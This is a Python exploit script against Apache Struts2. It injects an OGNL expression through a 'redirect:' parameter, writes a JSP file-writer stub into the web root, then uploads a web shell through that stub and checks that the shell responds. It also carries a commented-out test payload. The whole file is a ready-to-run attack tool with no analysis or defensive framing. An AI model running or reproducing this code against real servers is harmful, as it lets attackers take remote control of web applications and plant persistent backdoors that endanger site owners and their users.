#coding : utf-8
__author__ = 'Phtih0n'
import requests, sys, urllib

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}

def GetHost(url):
	(type, rest) = urllib.splittype(url)
	(host, rest) = urllib.splithost(rest)
	return (type + "://" + host + "/")

def UpData(url):
    ma = file("shell.jsp")
    str = ma.read()
    param = {}
    param['f'] = 'bakup.jsp'
    param['t'] = str
    r = requests.post(url + "phithon.jsp", data=param, headers=headers)
    r = requests.get(url + param['f'], headers=headers, allow_redirects=False)
    if 200 == r.status_code:
        print "success"
        print "shell : " + url + param['f']
    else:
        print "fail"

def GetShell(url):
    test = url + r'''/Struts2/test.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22phithon.jsp%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e'''
    r = requests.get(test, headers = headers )
    url = GetHost(url)
    r = requests.get(url + "phithon.jsp", headers = headers)
    if r.status_code == 200:
    	UpData(url)
    else:
        print "fail"

try:
    url = sys.argv[1]
except:
    print "usage : %s url" % sys.argv[0]
GetShell(url)

#/Struts2/test.action?redirect:${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[phithon]'),%23w.flush(),%23w.close()}
